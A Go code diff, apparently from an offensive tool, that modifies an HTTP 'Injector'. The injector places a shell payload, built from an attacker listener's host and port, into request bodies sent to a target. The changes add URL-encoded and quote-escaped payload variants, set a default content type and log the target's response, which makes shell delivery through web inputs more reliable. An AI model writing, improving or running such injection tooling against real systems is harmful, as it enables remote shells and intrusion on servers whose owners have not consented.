@@ -34,7 +34,15 @@ func (i *Injector) Do(ctx context.Context) error {
 	var body io.Reader = nil
 
 	if i.hasData() {
-		body = strings.NewReader(i.setPayload(i.data))
+		if i.hasHeader("Content-Type") {
+			if strings.Contains(i.data, "\"") {
+				body = strings.NewReader(i.setPayloadEscaped(i.data))
+			} else {
+				body = strings.NewReader(i.setPayload(i.data))
+			}
+		} else {
+			body = strings.NewReader(i.setPayloadUrlEncoded(i.data))
+		}
 	}
 
 	req, err := http.NewRequestWithContext(ctx, i.method, url, body)
@@ -48,6 +56,11 @@ func (i *Injector) Do(ctx context.Context) error {
 		}
 	}
 
+	// Default to urlencoded if no content type is specified
+	if i.hasData() && !i.hasHeader("Content-Type") {
+		req.Header.Set("Content-Type", "application/x-www-form-urlencoded")
+	}
+
 	client := &http.Client{
 		Timeout: 3 * time.Second,
 	}
@@ -57,6 +70,10 @@ func (i *Injector) Do(ctx context.Context) error {
 		return err
 	}
 	defer resp.Body.Close()
+
+	b, _ := io.ReadAll(resp.Body)
+	log.Infof("Response: %s", string(b))
+
 	return nil
 }
 
@@ -89,6 +106,11 @@ func (i *Injector) hasData() bool {
 	return i.data != ""
 }
 
+func (i *Injector) hasHeader(name string) bool {
+	_, ok := i.headers[name]
+	return ok
+}
+
 func (i *Injector) setPayload(value string) string {
 	payload := payloads.Get(i.payloadName, i.listenerConfig.Host, i.listenerConfig.Port)
 	return strings.Replace(value, ShellDropKeyword, payload, -1)
@@ -97,4 +119,10 @@ func (i *Injector) setPayload(value string) string {
 func (i *Injector) setPayloadUrlEncoded(value string) string {
 	payload := payloads.GetUrlEncoded(i.payloadName, i.listenerConfig.Host, i.listenerConfig.Port)
 	return strings.Replace(value, ShellDropKeyword, payload, -1)
+}
+
+func (i *Injector) setPayloadEscaped(value string) string {
+	payload := payloads.Get(i.payloadName, i.listenerConfig.Host, i.listenerConfig.Port)
+	escapedPayload := strings.ReplaceAll(payload, `"`, `\"`)
+	return strings.Replace(value, ShellDropKeyword, escapedPayload, -1)
 }
